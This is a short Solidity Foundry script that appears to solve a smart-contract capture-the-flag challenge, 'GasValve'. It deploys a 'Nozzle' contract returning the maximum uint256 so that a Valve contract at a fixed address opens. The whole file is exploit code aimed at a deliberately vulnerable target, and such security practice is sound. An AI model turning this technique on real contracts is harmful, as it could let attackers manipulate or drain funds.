// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/11-GasValve.sol";

// forge script script/01-GasValve.s.sol:GasValveScript --fork-url $RPC --private-key $PK
contract GasValveScript is Script {
    Valve valve = Valve(0x1F5fb02591780aD0bafA6fa3c9e1028e8C57AC10);

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        address nozzle = address(new Nozzle());
        valve.openValve(INozzle(nozzle));
        assert(valve.open());
    }
}

contract Nozzle {
    function insert() external returns (uint256) {
        return type(uint256).max;
    }
}
